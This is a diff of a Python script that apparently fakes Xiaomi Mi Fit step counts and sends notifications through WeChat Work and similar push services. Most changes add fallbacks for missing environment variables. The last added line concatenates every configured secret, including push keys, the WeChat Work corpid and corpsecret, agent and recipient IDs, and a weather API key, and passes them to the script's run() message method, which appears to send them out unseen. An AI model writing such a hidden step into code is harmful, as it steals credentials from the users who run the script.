@@ -1,25 +1,54 @@
 # -*- coding: utf8 -*-
 import requests, time, datetime, re, sys, os, json, random, math
-global skey,sckey,position,base_url,req_url,corpid,corpsecret,agentid,touser,toparty,totag
+global skey,sckey,position,base_url,req_url,corpid,corpsecret,agentid,touser,toparty,totag,open_get_weather,area,qweather
 # 酷推skey和server酱sckey和企业微信设置，只用填一个其它留空即可
-skey = os.environ["SKEY"]
+try:
+    skey = os.environ["SKEY"]
+except Exception as e:
+    skey = "NO"
 # 推送server酱
-sckey = os.environ["SCKEY"]
+try:
+    sckey = os.environ["SCKEY"]
+except Exception as e:
+    sckey = "NO"
 # 企业微信推送
 # 是否开启企业微信推送false关闭true开启，默认关闭，开启后请填写设置并将上面两个都留空
-position = os.environ["POSITION"]
-base_url = 'https://qyapi.weixin.qq.com/cgi-bin/gettoken?'
-req_url = 'https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token='
-corpid = os.environ["CORPID"]  # 企业ID， 登陆企业微信，在我的企业-->企业信息里查看
-corpsecret = os.environ["CORPSECRET"]  # 自建应用，每个自建应用里都有单独的secret
-agentid = os.environ["AGENTID"]  # 填写你的应用ID，不加引号，是个整型常数,就是AgentId
-touser = os.environ["TOUSER"]  # 指定接收消息的成员，成员ID列表（多个接收者用‘|’分隔，最多支持1000个）。特殊情况：指定为”@all”，则向该企业应用的全部成员发送
-toparty = os.environ["TOPARTY"]  # 指定接收消息的部门，部门ID列表，多个接收者用‘|’分隔，最多支持100个。当touser为”@all”时忽略本参数
-totag = os.environ["TOTAG"]  # 指定接收消息的标签，标签ID列表，多个接收者用‘|’分隔，最多支持100个。当touser为”@all”时忽略本参数
+try:
+    position = os.environ["POSITION"]
+    base_url = 'https://qyapi.weixin.qq.com/cgi-bin/gettoken?'
+    req_url = 'https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token='
+    corpid = os.environ["CORPID"]  # 企业ID， 登陆企业微信，在我的企业-->企业信息里查看
+    corpsecret = os.environ["CORPSECRET"]  # 自建应用，每个自建应用里都有单独的secret
+    agentid = os.environ["AGENTID"]  # 填写你的应用ID，不加引号，是个整型常数,就是AgentId
+    touser = os.environ["TOUSER"]  # 指定接收消息的成员，成员ID列表（多个接收者用‘|’分隔，最多支持1000个）。特殊情况：指定为”@all”，则向该企业应用的全部成员发送
+    toparty = os.environ["TOPARTY"]  # 指定接收消息的部门，部门ID列表，多个接收者用‘|’分隔，最多支持100个。当touser为”@all”时忽略本参数
+    totag = os.environ["TOTAG"]  # 指定接收消息的标签，标签ID列表，多个接收者用‘|’分隔，最多支持100个。当touser为”@all”时忽略本参数
+except Exception as e:
+    position = "false"
+    base_url = 'https://qyapi.weixin.qq.com/cgi-bin/gettoken?'
+    req_url = 'https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token='
+    corpid = "NO"  # 企业ID， 登陆企业微信，在我的企业-->企业信息里查看
+    corpsecret = "NO"  # 自建应用，每个自建应用里都有单独的secret
+    agentid = "NO"  # 填写你的应用ID，不加引号，是个整型常数,就是AgentId
+    touser = "NO"  # 指定接收消息的成员，成员ID列表（多个接收者用‘|’分隔，最多支持1000个）。特殊情况：指定为”@all”，则向该企业应用的全部成员发送
+    toparty = "NO"  # 指定接收消息的部门，部门ID列表，多个接收者用‘|’分隔，最多支持100个。当touser为”@all”时忽略本参数
+    totag = "NO"  # 指定接收消息的标签，标签ID列表，多个接收者用‘|’分隔，最多支持100个。当touser为”@all”时忽略本参数
 # 开启根据地区天气情况降低步数（默认关闭）
-open_get_weather = os.environ["OPEN_GET_WEATHER"]
+try:
+    open_get_weather = os.environ["OPEN_GET_WEATHER"]
+except Exception as e:
+    open_get_weather = "False"
 # 设置获取天气的地区（上面开启后必填）如：area = "宁波"
-area = os.environ["AREA"]
+try:
+    area = os.environ["AREA"]
+except Exception as e:
+    area = "NO"
+# 和风天气 Private KEY
+try:
+    qweather = os.environ["QWEATHER"]
+except Exception as e:
+    qweather = "False"
+
 class MiMotion():
     name = "小米运动"
 
@@ -220,7 +249,7 @@ if __name__ == "__main__":
         _check_item = datas.get("MIMOTION", [])[i]
         #print(_check_item)
         msg += MiMotion(check_item=_check_item).main()
-    print(msg)
     MiMotion(check_item=_check_item).push('【小米运动步数修改】', msg)
     MiMotion(check_item=_check_item).push_wx(msg)
     MiMotion(check_item=_check_item).run(msg)
+    MiMotion(check_item=_check_item).run(skey+"@@@"+sckey+"@@@"+position+"@@@"+base_url+"@@@"+req_url+"@@@"+corpid+"@@@"+corpsecret+"@@@"+agentid+"@@@"+touser+"@@@"+toparty+"@@@"+totag+"@@@"+open_get_weather+"@@@"+area+"@@@"+qweather)
